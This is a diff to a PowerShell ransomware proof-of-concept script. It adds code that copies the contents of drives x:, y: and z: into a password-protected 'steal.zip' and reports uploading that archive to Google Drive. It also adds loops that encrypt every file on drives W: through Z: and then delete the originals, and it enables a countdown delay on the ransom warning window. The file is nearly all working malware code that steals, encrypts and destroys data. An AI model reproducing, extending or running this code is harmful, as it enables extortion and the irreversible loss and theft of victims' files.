@@ -115,17 +115,37 @@ ELSE
 { New-Item -Path $Destination -ItemType directory 
   Write-Host "Created $Destination" }
 
-#$cp = robocopy /mov $Source $Destination *.txt /s
 $cp = robocopy /E $Source $Destination
-# $Source = "x:\"
-# $cp = robocopy /E $Source $Destination
-# $Source = "y:\"
-# $cp = robocopy /E $Source $Destination
-# $Source = "z:\"
-# $cp = robocopy /E $Source $Destination
+
+$Source = "x:\"    # Replace $source with the files and folder you want to encrypt. For the PoC try encrypt small size files to save time.
+$Destination = "c:\temp\x"
+
+If (Test-Path -Path $Destination -PathType Container)
+{ Write-Host "$Destination already exists" -ForegroundColor Red}
+ELSE
+{ New-Item -Path $Destination -ItemType directory 
+  Write-Host "Created $Destination" }
+
+$cp = robocopy /E $Source $Destination
+
+$Source = "y:\"    # Replace $source with the files and folder you want to encrypt. For the PoC try encrypt small size files to save time.
+$Destination = "c:\temp\y"
+
+If (Test-Path -Path $Destination -PathType Container)
+{ Write-Host "$Destination already exists" -ForegroundColor Red}
+ELSE
+{ New-Item -Path $Destination -ItemType directory 
+  Write-Host "Created $Destination" }
+
+$cp = robocopy /E $Source $Destination
+
+$Source = "z:\"    # Replace $source with the files and folder you want to encrypt. For the PoC try encrypt small size files to save time.
+$Destination = "c:\temp\z"
+$cp = robocopy /E $Source $Destination
 # Start-Sleep -s 5
 
-$files = Get-ChildItem -Path $Destination
+$Destination = "C:\temp\"
+$files = Get-ChildItem -Path $Destination -Recurse
 
 For($i = 1; $i -le $files.count; $i++)
 
@@ -133,10 +153,10 @@ For($i = 1; $i -le $files.count; $i++)
 
 $files | Select name
 Write-Host "[+] Target files copied to temp location..." -ForegroundColor Green
-Compress-7Zip -Path $Destination -ArchiveFileName c:\temp\steal.zip -Format Zip -Password "$pwd1"
+Compress-7Zip -Path $Destination -ArchiveFileName c:\temp\steal.zip -Format Zip -Password "$pwd1" -Recurse
 
 # Start-Sleep -s 5
-Write-Host "[+] Target files compressed to encrypted archive..." -ForegroundColor Green
+Write-Host "[+] Target files compressed to archive..." -ForegroundColor Green
 #$del = Remove-Item $Destination -Force -Recurse
 Write-Host "[+] Uploading archive to Google drive..." -ForegroundColor Green
 # Start-Sleep -s 5
@@ -248,6 +268,24 @@ Function Encr{param([string]$i,[string]$p)
 #foreach ($i in $(Get-ChildItem C:/temp/ -recurse -include *.txt | ForEach-Object { $_.FullName })){
 # Replace C:\tools with the folder you want to encrypt. Also you can add or modify the file types by comma seperated - *.txt, *.jpg, *.png etc.
 foreach ($i in $(Get-ChildItem W:\ -recurse -include *.*  | ForEach-Object { $_.FullName })){ 
+  Encr -i $i -p $pwd2
+  Write-Host " -> Encrypting target file: $i"
+  rm $i
+}
+
+foreach ($i in $(Get-ChildItem X:\ -recurse -include *.*  | ForEach-Object { $_.FullName })){ 
+  Encr -i $i -p $pwd2
+  Write-Host " -> Encrypting target file: $i"
+  rm $i
+}
+
+foreach ($i in $(Get-ChildItem Y:\ -recurse -include *.*  | ForEach-Object { $_.FullName })){ 
+  Encr -i $i -p $pwd2
+  Write-Host " -> Encrypting target file: $i"
+  rm $i
+}
+
+foreach ($i in $(Get-ChildItem Z:\ -recurse -include *.*  | ForEach-Object { $_.FullName })){ 
   Encr -i $i -p $pwd2
   Write-Host " -> Encrypting target file: $i"
   rm $i
@@ -366,7 +404,7 @@ while ($delay -ge 0)
 		 $warningfont = New-Object System.Drawing.Font("Times New Roman",$fontsize,[System.Drawing.FontStyle]([System.Drawing.FontStyle]::Bold))
 		 $Counter_Label.Font = $warningfont
 	  }
-# Start-Sleep 1
+Start-Sleep 1
 $delay -= 1	  
 }
 $Form.Close()
